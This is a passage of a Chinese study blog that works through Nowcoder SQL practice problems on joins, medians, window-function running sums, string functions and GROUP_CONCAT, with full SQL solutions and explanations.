src="https://uploadfiles.nowcoder.com/images/20210305/301499_1614931927046/10AF6822A92E37CE34B3EFFF8522E033" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>解析:</p><p>第1行表示Python岗位在2025年2月收到了93份简历，在对应的2026年2月收到了846份简历</p><p>。。。</p><p>最后1行表示C++岗位在2025年1月收到了107份简历，在对应的2026年1月收到了470份简历</p></blockquote><p>这道题难度说是困难，但其实很简单。</p><ol><li><p>首先看字段，像不像是两个<code>(job,date,cnt)</code>字段的表进行连接。得到只有左边三个字段很容易的，所以我们先查询得到这部分：</p><blockquote><p>– 子查询</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">DATE_FORMAT</span>(<span class="hljs-built_in">date</span>,<span class="hljs-string">'%Y-%m'</span>) <span class="hljs-keyword">AS</span> mon,<span class="hljs-keyword">SUM</span>(<span class="hljs-keyword">num</span>) <span class="hljs-keyword">AS</span> cnt<span class="hljs-keyword">FROM</span> resume_info<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">DATE_FORMAT</span>(<span class="hljs-built_in">date</span>,<span class="hljs-string">'%Y'</span>) = <span class="hljs-number">2025</span><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job,mon<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> mon <span class="hljs-keyword">DESC</span>,cnt <span class="hljs-keyword">DESC</span></code></pre></div></blockquote><p>​        那么要得到2026年的数据，只需要把上面的WHERE条件中的2025改成2026即可。</p></li><li><p>我们将上面两个子表（2025年数据和2026年数据）分别命名为a、b，然后进行连接</p><blockquote><p>– 表连接</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> a.job,a.mon,a.cnt,b.mon,b.cnt<span class="hljs-keyword">FROM</span> a, b<span class="hljs-keyword">WHERE</span> a.job =b.job<span class="hljs-keyword">AND</span> <span class="hljs-keyword">SUBSTR</span>(a.mon,<span class="hljs-number">-2</span>) = <span class="hljs-keyword">SUBSTR</span>(b.mon,<span class="hljs-number">-2</span>)<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> a.mon <span class="hljs-keyword">DESC</span>,job <span class="hljs-keyword">DESC</span></code></pre></div></blockquote><p>这里表连接有两个连接词，一个是<code>job</code>，另一个是<code>mon的后面两个字符串</code>(即月份)，因为2025年和2026年不同，所以需要把年份去掉，即只取月份。这里用<code>SUBSTR()</code>函数实现（该函数仅用于字符串类型），<code>SUBSTR(mon,-2)</code>表示取mon字段的最后两个字符。</p></li></ol><p>完整SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> a.job,a.mon,a.cnt,b.mon,b.cnt<span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">DATE_FORMAT</span>(<span class="hljs-built_in">date</span>,<span class="hljs-string">'%Y-%m'</span>) <span class="hljs-keyword">AS</span> mon,<span class="hljs-keyword">SUM</span>(<span class="hljs-keyword">num</span>) <span class="hljs-keyword">AS</span> cnt    <span class="hljs-keyword">FROM</span> resume_info    <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">DATE_FORMAT</span>(<span class="hljs-built_in">date</span>,<span class="hljs-string">'%Y'</span>) = <span class="hljs-number">2025</span>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job,mon    <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> mon <span class="hljs-keyword">DESC</span>,cnt <span class="hljs-keyword">DESC</span>) a,(    <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">DATE_FORMAT</span>(<span class="hljs-built_in">date</span>,<span class="hljs-string">'%Y-%m'</span>) <span class="hljs-keyword">AS</span> mon,<span class="hljs-keyword">SUM</span>(<span class="hljs-keyword">num</span>) <span class="hljs-keyword">AS</span> cnt    <span class="hljs-keyword">FROM</span> resume_info    <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">DATE_FORMAT</span>(<span class="hljs-built_in">date</span>,<span class="hljs-string">'%Y'</span>) = <span class="hljs-number">2026</span>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job,mon    <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> mon <span class="hljs-keyword">DESC</span>,cnt <span class="hljs-keyword">DESC</span>) b<span class="hljs-keyword">WHERE</span> a.job =b.job<span class="hljs-keyword">AND</span> <span class="hljs-keyword">SUBSTR</span>(a.mon,<span class="hljs-number">-2</span>) = <span class="hljs-keyword">SUBSTR</span>(b.mon,<span class="hljs-number">-2</span>)<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> a.mon <span class="hljs-keyword">DESC</span>,job <span class="hljs-keyword">DESC</span></code></pre></div><h2 id="中位数"><a href="#中位数" class="headerlink" title="中位数"></a>中位数</h2><h3 id="取整"><a href="#取整" class="headerlink" title="取整"></a>取整</h3><h4 id="SQL75-考试分数-四-（较难）"><a href="#SQL75-考试分数-四-（较难）" class="headerlink" title="SQL75 考试分数(四)（较难）"></a><a href="https://www.nowcoder.com/practice/502fb6e2b1ad4e56aa2e0dd90c6edf3c?tpId=82&amp;tags=&amp;title=&amp;difficulty=0&amp;judgeStatus=0&amp;rp=1" target="_blank" rel="noopener"><strong>SQL75</strong> <strong>考试分数(四)</strong></a>（较难）</h4><blockquote><p>描述</p><p>牛客每次考试完，都会有一个成绩表(grade)，如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210204/557336_1612434754935/ECC08FF796C5751177B2300798551D67" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示用户id为1的用户选择了C++岗位并且考了11001分</p><p>。。。</p><p>第8行表示用户id为8的用户选择了B语言岗位并且考了9999分</p><p>请你写一个sql语句查询各个岗位分数升序排列之后的中位数位置的范围，并且按job升序排序，结果如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210204/557336_1612434773205/02F13D43D70927AC143B7ADE08DC301F" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>解释:</p><p>第1行表示C++岗位的中位数位置范围为[2,2]，也就是2。因为C++岗位总共3个人，是奇数，所以中位数位置为2是正确的(即位置为2的10000是中位数)</p><p>第2行表示Java岗位的中位数位置范围为[1,2]。因为Java岗位总共2个人，是偶数，所以要知道中位数，需要知道2个位置的数字，而因为只有2个人，所以中位数位置为[1,2]是正确的(即需要知道位置为1的12000与位置为2的13000才能计算出中位数为12500)</p><p>第3行表示前端岗位的中位数位置范围为[2,2]，也就是2。因为B语言岗位总共3个人，是奇数，所以中位数位置为2是正确的(即位置为2的11000是中位数)</p><p>(注意: sqlite 1/2得到的不是0.5，得到的是0，只有1*1.0/2才会得到0.5，sqlite四舍五入的函数为round，sqlite不支持floor函数，支持cast(x as integer) 函数，不支持if函数，支持case when …then …else ..end函数)</p></blockquote><p>中位数！！！咋一看以为这是排序题，然后发现并不需要排序</p><p>思路：</p><ol><li><p>GROUP BY + COUNT(*)统计各个岗位的数量</p><p><code>SELECT job,COUNT(*) AS num FROM grade  GROUP BY job</code></p><p>将查询结果命名为子表a</p></li><li><p>用<code>IF(expr1,a,b)</code>将岗位数分为单数、双数两种情况处理</p><p>其中，当岗位数为单数时，start和end相同，其中位数都是(这里岗位数命名为num) num/2并向上取整【例如，5的中位数是5/2并向上取整，即3】</p><p>当岗位数为双数时，其中位数start是num/2，end是num/2+1【例如，6的两个中位数分别是6/2即3，以及6/2+1即4】</p></li></ol><p>完整SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">num</span>%<span class="hljs-number">2</span>=<span class="hljs-number">1</span>,<span class="hljs-keyword">CEILING</span>(<span class="hljs-keyword">num</span>/<span class="hljs-number">2</span>),<span class="hljs-keyword">ROUND</span>(<span class="hljs-keyword">num</span>/<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)) ,<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">num</span>%<span class="hljs-number">2</span>=<span class="hljs-number">1</span>,<span class="hljs-keyword">CEILING</span>(<span class="hljs-keyword">num</span>/<span class="hljs-number">2</span>),<span class="hljs-keyword">ROUND</span>(<span class="hljs-keyword">num</span>/<span class="hljs-number">2</span>+<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)) <span class="hljs-keyword">FROM</span> (     <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> grade    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job) a<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> job</code></pre></div><h4 id="SQL76-考试分数-五"><a href="#SQL76-考试分数-五" class="headerlink" title="SQL76 考试分数(五)"></a><a href="#NIUKE_SQL76">SQL76 考试分数(五)</a></h4><h3 id="正序-逆序"><a href="#正序-逆序" class="headerlink" title="正序+逆序"></a>正序+逆序</h3><h4 id="SQL88-最差是第几名-二-（较难）"><a href="#SQL88-最差是第几名-二-（较难）" class="headerlink" title="SQL88 最差是第几名(二)（较难）"></a><a href="https://www.nowcoder.com/practice/165d88474d434597bcd2af8bf72b24f1?tpId=82&amp;tags=&amp;title=&amp;difficulty=0&amp;judgeStatus=0&amp;rp=1" target="_blank" rel="noopener"><strong>SQL88</strong> <strong>最差是第几名(二)</strong></a>（较难）</h4><blockquote><p>描述</p><p>TM小哥和FH小妹在牛客大学若干年后成立了牛客SQL班，班的每个人的综合成绩用A,B,C,D,E表示，90分以上都是A，80<del>90分都是B，60</del>70分为C，50~60为D，E为50分以下</p><p>因为每个名次最多1个人，比如有2个A，那么必定有1个A是第1名，有1个A是第2名(综合成绩同分也会按照某一门的成绩分先后)。</p><p>每次SQL考试完之后，老师会将班级成绩表展示给同学看。</p><p>现在有班级成绩表(class_grade)如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210310/301499_1615348808889/89751765A8ABF251A21CBC1F35C7E2D8" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示成绩为A的学生有2个</p><p>…….</p><p>最后1行表示成绩为D的学生有2个</p><p>老师想知道学生们综合成绩的中位数是什么档位，请你写SQL帮忙查询一下，如果只有1个中位数，输出1个，如果有2个中位数，按grade升序输出，以上例子查询结果如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210310/301499_1615348944255/9CE3BEF4C093F1FBE8525594E5882325" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>解析:</p><p>总体学生成绩排序如下:A, A, B, B, B, B, C, C, C, C, D, D，总共12个数，取中间的2个，取6，7为:B,</p></blockquote><p>思路：</p><p>因为中位数可能有两个（累计和为单数和双数两种情况），故可以采用另一种思路，<strong>正逆序累计和都大于等于综合的一半</strong>。</p><p>生成两个累计和，一个正序一个逆序，当正序和逆序都大于等于总和的一半时，即为中位数，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210810013846.png" srcset="/img/loading.gif" lazyload="" alt=""></p><ol><li><p>生成正逆序累计和</p><blockquote><p>– 子查询（正逆序累计和）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span>  grade,<span class="hljs-keyword">SUM</span>(<span class="hljs-built_in">number</span>) <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade) <span class="hljs-keyword">AS</span> rs1,<span class="hljs-keyword">SUM</span>(<span class="hljs-built_in">number</span>) <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">AS</span> rs2<span class="hljs-keyword">FROM</span> class_grade<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span>  grade</code></pre></div></blockquote></li><li><p>外层嵌套，加上过滤条件</p></li></ol><p>完整SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> grade <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span>  grade,<span class="hljs-keyword">SUM</span>(<span class="hljs-built_in">number</span>) <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade) <span class="hljs-keyword">AS</span> rs1,<span class="hljs-keyword">SUM</span>(<span class="hljs-built_in">number</span>) <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">AS</span> rs2    <span class="hljs-keyword">FROM</span> class_grade    <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span>  grade) t<span class="hljs-keyword">WHERE</span> t.rs1 &gt;= (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">SUM</span>(<span class="hljs-built_in">number</span>) <span class="hljs-keyword">FROM</span> class_grade)/<span class="hljs-number">2</span><span class="hljs-keyword">AND</span> t.rs2 &gt;= (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">SUM</span>(<span class="hljs-built_in">number</span>) <span class="hljs-keyword">FROM</span> class_grade)/<span class="hljs-number">2</span></code></pre></div><h2 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h2><h4 id="SQL51-查找字符串-10-A-B-中逗号-出现的次数cnt（中等）"><a href="#SQL51-查找字符串-10-A-B-中逗号-出现的次数cnt（中等）" class="headerlink" title="SQL51 查找字符串 10,A,B 中逗号,出现的次数cnt（中等）"></a><a href="https://www.nowcoder.com/practice/e3870bd5d6744109a902db43c105bd50?tpId=82&amp;&amp;tqId=29819&amp;rp=1&amp;ru=/activity/oj&amp;qru=/ta/sql/question-ranking" target="_blank" rel="noopener"><strong>SQL51</strong> <strong>查找字符串 10,A,B 中逗号,出现的次数cnt</strong></a>（中等）</h4><blockquote><p>描述</p><p>查找字符串’10,A,B’ 中逗号’,’出现的次数cnt。</p><p>示例1</p><p>输入：</p><div class="hljs code-wrapper"><pre><code class="hljs 1c"><span class="hljs-string">"10,A,B"</span></code></pre></div><p>输出：</p><div class="hljs code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-number">2.0000</span></code></pre></div></blockquote><p>思路：用<code>REPLACE()</code>函数替换需要处理的字符串，将逗号替换为空，用<code>length()</code>函数统计原字符串长度以及处理后的字符串长度，相减得到个数</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> (<span class="hljs-keyword">length</span>(<span class="hljs-string">'10,A,B'</span>) - <span class="hljs-keyword">length</span>(<span class="hljs-keyword">REPLACE</span>(<span class="hljs-string">'10,A,B'</span>,<span class="hljs-string">","</span>,<span class="hljs-string">""</span>))) <span class="hljs-keyword">AS</span> cnt</code></pre></div><blockquote><p>拓展：此题不需要取整，如果需要取整的话可以用<code>ROUND()</code>函数</p></blockquote><h4 id="SQL52-获取Employees中的first-name（中等）"><a href="#SQL52-获取Employees中的first-name（中等）" class="headerlink" title="SQL52 获取Employees中的first_name（中等）"></a><a href="https://www.nowcoder.com/practice/74d90728827e44e2864cce8b26882105?tpId=82&amp;&amp;tqId=29820&amp;rp=1&amp;ru=/activity/oj&amp;qru=/ta/sql/question-ranking" target="_blank" rel="noopener"><strong>SQL52</strong> <strong>获取Employees中的first_name</strong></a>（中等）</h4><p>（我觉得题名该写成<strong>SQL52</strong> <strong>获取Employees中的first_name并按照first_name后两个字符串排序</strong>）</p><blockquote><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>获取Employees中的first_name，查询按照first_name最后两个字母，按照升序进行排列<br>CREATE TABLE <code>employees</code> (<br><code>emp_no</code> int(11) NOT NULL,<br><code>birth_date</code> date NOT NULL,<br><code>first_name</code> varchar(14) NOT NULL,<br><code>last_name</code> varchar(16) NOT NULL,<br><code>gender</code> char(1) NOT NULL,<br><code>hire_date</code> date NOT NULL,<br>PRIMARY KEY (<code>emp_no</code>));<br>输出格式：</p><table><thead><tr><th align="left">first_name</th></tr></thead><tbody><tr><td align="left">Chirstian</td></tr><tr><td align="left">Tzvetan</td></tr><tr><td align="left">Bezalel</td></tr><tr><td align="left">Duangkaew</td></tr></tbody></table></blockquote><p>这个是很常规的<code>select 字段名 from tablename order by</code>型题，但是这里重在<strong>按照字段的最后两个字母排序</strong>。<code>SUBSTR()</code>函数可以获取字符串的部分字符，所以这里可以用<code>SUBSTR(first_name,-2)</code>，表示获取first_name字符串的最后两个字符，于是SQL实现如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">SUBSTR</span>(first_name,<span class="hljs-number">-2</span>)</code></pre></div><blockquote><p>拓展</p><p>1、substr函数格式  (字符截取函数) </p><div class="hljs code-wrapper"><pre><code class="hljs sql">　　<span class="hljs-comment">-- 格式1 </span>　　substr(stringname, a, b);　　<span class="hljs-comment">-- 格式2</span>　　substr(stringname, a) ;</code></pre></div><p>解析：</p><p>格式1：<br> 1、string 需要截取的字符串<br>  2、a 截取字符串的开始位置（注：当a等于0或1时，都是从第一位开始截取）<br> 3、b 要截取的字符串的长度</p><p>格式2：<br> 1、string 需要截取的字符串<br> 2、a 可以理解为从第a个字符开始截取后面所有的字符串。</p></blockquote><p>此外，也可以用<code>RIGHT()</code>函数，这题将SUBSRT函数换成``RIGHT(first_name,2)<code>也可以达到同样的效果，表示从右开始数截取两个字符（所以</code>LEFT(first_name,2)<code>函数就表示从左开始截取first_name字段的2个字符）。限于认知水平，本人觉得</code>RIGHT()<code>和</code>LEFT()`很鸡肋。</p><h4 id="SQL83-牛客的课程订单分析-七-（较难）"><a href="#SQL83-牛客的课程订单分析-七-（较难）" class="headerlink" title="SQL83 牛客的课程订单分析(七)（较难）"></a><a href="https://www.nowcoder.com/practice/d6f4a37f966145da8900ba9edcc4c068?tpId=82&amp;tags=&amp;title=&amp;difficulty=0&amp;judgeStatus=0&amp;rp=1" target="_blank" rel="noopener"><strong>SQL83</strong> <strong>牛客的课程订单分析(七)</strong></a>（较难）</h4><blockquote><p>描述</p><p>有很多同学在牛客购买课程来学习，购买会产生订单存到数据库里。</p><p>有一个订单信息表(order_info)，简况如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210226/310548_1614323798769/031537881B33EBB979D8E6E63131CE63" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示user_id为557336的用户在2025-10-10的时候使用了client_id为1的客户端下了C++课程的<strong>非拼团**</strong>(is_group_buy<strong><strong>为</strong></strong>N<strong><strong>o</strong></strong>)**订单，但是状态为没有购买成功。</p><p>第2行表示user_id为230173543的用户在2025-10-12的时候使用了client_id为2的客户端下了Python课程的非拼团<strong>(is_group_buy**</strong>为<strong><strong>N</strong></strong>o<strong>**)</strong>订单，状态为购买成功。</p><p>。。。</p><p>最后1行表示user_id为557336的用户在2025-10-25的时候使用了下了C++课程的拼团<strong>(is_group_buy**</strong>为<strong>**Yes)</strong>订单，拼团不统计客户端，所以<strong>client_id</strong>所以为<strong>0</strong>，状态为购买成功。</p><p>有一个客户端表(client)，简况如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210226/310548_1614323833226/E5783422025D1F46BE7EF16FEE660647" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>请你写出一个sql语句查询在2025-10-15以后，同一个用户下单2个以及2个以上状态为购买成功的C++课程或Java课程或Python课程的来源信息，第一列是显示的是客户端名字，如果是拼团订单则显示GroupBuy，第二列显示这个客户端(或者是拼团订单)有多少订单，最后结果按照第一列(source)升序排序，以上例子查询结果如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210226/310548_1614323840965/A1722B1F53A15FC02282C10E33E90645" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>解析:</p><p>id为4，6的订单满足以上条件，且因为4是通过IOS下单的非拼团订单，则记: IOS 1</p><p>，6是通过PC下单的非拼团订单，则记: PC 1;</p><p>id为5，7的订单满足以上条件，且因为5与7都是拼团订单，则记: GroupBuy 2;</p><p>最后按照source升序排序。</p></blockquote><p>思路：</p><ol><li><p>先获得符合条件的数据作为子表，还是依赖WHERE 条件实现过滤，整体思路是：</p><p>`SELECT * FROM order_info WHERE user_id IN (    )</p><div class="hljs code-wrapper"><pre><code>`</code></pre></div><p>然后将条件补充完整，如下：</p><blockquote><p>– 子查询</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> order_info<span class="hljs-keyword">WHERE</span> user_id <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> order_info    <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span>    <span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)    <span class="hljs-keyword">AND</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id    <span class="hljs-keyword">HAVING</span> <span class="hljs-keyword">COUNT</span>(*) &gt;= <span class="hljs-number">2</span>)<span class="hljs-keyword">AND</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span><span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)<span class="hljs-keyword">AND</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span></code></pre></div></blockquote></li><li><p>上述已经是一个符合条件的数据，所以接下来只需要进行<code>GROUP BY</code>分组查询即可</p><p>这里注意要用LEFT/RIGHT JOIN连接，并且将NULL替换成’GroupBuy’</p><blockquote><p>– 分组查询</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">IFNULL</span>(client.name,<span class="hljs-string">'GroupBuy'</span>) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">source</span>,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> cnt<span class="hljs-keyword">FROM</span>  a <span class="hljs-comment">-- 上述的子查询表</span><span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">client</span> <span class="hljs-keyword">ON</span> a.client_id = client.id<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> client.name<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">source</span></code></pre></div></blockquote></li></ol><p>完整SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">IFNULL</span>(client.name,<span class="hljs-string">'GroupBuy'</span>) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">source</span>,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> cnt<span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> order_info    <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-keyword">IN</span> (        <span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> order_info        <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span>        <span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)        <span class="hljs-keyword">AND</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span>        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id        <span class="hljs-keyword">HAVING</span> <span class="hljs-keyword">COUNT</span>(*) &gt;= <span class="hljs-number">2</span>    )    <span class="hljs-keyword">AND</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span>    <span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)    <span class="hljs-keyword">AND</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span>    ) a<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">client</span> <span class="hljs-keyword">ON</span> a.client_id = client.id<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> client.name<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">source</span></code></pre></div><h2 id="字段拼接"><a href="#字段拼接" class="headerlink" title="字段拼接"></a>字段拼接</h2><h4 id="将employees表中的所有员工的last-name和first-name通过引号连接起来（中等）"><a href="#将employees表中的所有员工的last-name和first-name通过引号连接起来（中等）" class="headerlink" title="将employees表中的所有员工的last_name和first_name通过引号连接起来（中等）"></a><a href="https://www.nowcoder.com/practice/810bf4ee3ac64949b08983aa66ec7bee?tpId=82&amp;&amp;tqId=29818&amp;rp=1&amp;ru=/activity/oj&amp;qru=/ta/sql/question-ranking" target="_blank" rel="noopener"><strong>将employees表中的所有员工的last_name和first_name通过引号连接起来</strong></a>（中等）</h4><blockquote><p>描述</p><p>将employees表中的所有员工的last_name和first_name通过(‘)连接起来。(sqlite不支持concat，请用||实现，mysql支持concat)<br>CREATE TABLE <code>employees</code> (<br><code>emp_no</code> int(11) NOT NULL,<br><code>birth_date</code> date NOT NULL,<br><code>first_name</code> varchar(14) NOT NULL,<br><code>last_name</code> varchar(16) NOT NULL,<br><code>gender</code> char(1) NOT NULL,<br><code>hire_date</code> date NOT NULL,<br>PRIMARY KEY (<code>emp_no</code>));<br>输出格式:</p><table><thead><tr><th align="left">name</th></tr></thead><tbody><tr><td align="left">Facello’Georgi</td></tr><tr><td align="left">Simmel’Bezalel</td></tr><tr><td align="left">Bamford’Parto</td></tr></tbody></table></blockquote><p><code>CONCAT( )</code>函数可以实现两个字段拼接，例如<code>CONCAT(a,b)</code>可以将字段a和字段b拼接成一个字段，如果拼接三个字段则<code>CONCAT(a,b,c)</code>，因而该题SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CONCAT</span>(last_name,<span class="hljs-string">"'"</span>,first_name) <span class="hljs-keyword">FROM</span> employees</code></pre></div><h4 id="SQL53-按照dept-no进行汇总（中等）"><a href="#SQL53-按照dept-no进行汇总（中等）" class="headerlink" title="SQL53 按照dept_no进行汇总（中等）"></a><a href="https://www.nowcoder.com/practice/6e86365af15e49d8abe2c3d4b5126e87?tpId=82&amp;tqId=29813&amp;rp=1&amp;ru=%2Factivity%2Foj&amp;qru=%2Fta%2Fsql%2Fquestion-ranking" target="_blank" rel="noopener"><strong>SQL53</strong> <strong>按照dept_no进行汇总</strong></a>（中等）</h4><blockquote><p>描述</p><p>按照dept_no进行汇总，属于同一个部门的emp_no按照逗号进行连接，结果给出dept_no以及连接出的结果employees<br>CREATE TABLE <code>dept_emp</code> (<br><code>emp_no</code> int(11) NOT NULL,<br><code>dept_no</code> char(4) NOT NULL,<br><code>from_date</code> date NOT NULL,<br><code>to_date</code> date NOT NULL,<br>PRIMARY KEY (<code>emp_no</code>,<code>dept_no</code>));<br>输出格式:</p><table><thead><tr><th align="left">dept_no</th><th align="left">employees</th></tr></thead><tbody><tr><td align="left">d001</td><td align="left">10001,10002</td></tr><tr><td align="left">d002</td><td align="left">10006</td></tr><tr><td align="left">d003</td><td align="left">10005</td></tr><tr><td align="left">d004</td><td align="left">10003,10004</td></tr></tbody></table></blockquote><p><code>CONCAT()</code>函数可以拼接两个或多个字段，所以这里的思路是对每个dept_no分组，然后拼接。</p><p>但CONCAT并不是聚合函数，在GROUP BY操作之后用CONCAT并不会将字段拼接（只会显示第一个），所以这里需要用聚合函数<code>GROUP_CONCAT</code>，正确SQL实现如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> dept_no,<span class="hljs-keyword">GROUP_CONCAT</span>(emp_no) employees<span class="hljs-keyword">FROM</span> dept_emp <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> dept_no</code></pre></div><h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><h4 id="SQL61-对于employees表中，给出奇数行的first-name（较难）"><a href="#SQL61-对于employees表中，给出奇数行的first-name（较难）" class="headerlink" title="SQL61 对于employees表中，给出奇数行的first_name（较难）"></a><a href="https://www.nowcoder.com/practice/e3cf1171f6cc426bac85fd4ffa786594?tpId=82&amp;&amp;tqId=29829&amp;rp=1&amp;ru=/activity/oj&amp;qru=/ta/sql/question-ranking" target="_blank" rel="noopener"><strong>SQL61</strong> <strong>对于employees表中，给出奇数行的first_name</strong></a>（较难）</h4><p>（我觉得题名该写成<strong>SQL61</strong> <strong>对于employees表中，first_name的行号由升序排序，给出结果数据顺序与原表相同的奇数行的first_name</strong>）</p><blockquote><p>描述</p><p>对于employees表中，输出first_name排名(按first_name升序排序)为奇数的first_name<br>CREATE TABLE <code>employees</code> (<br><code>emp_no</code> int(11) NOT NULL,<br><code>birth_date</code> date NOT NULL,<br><code>first_name</code> varchar(14) NOT 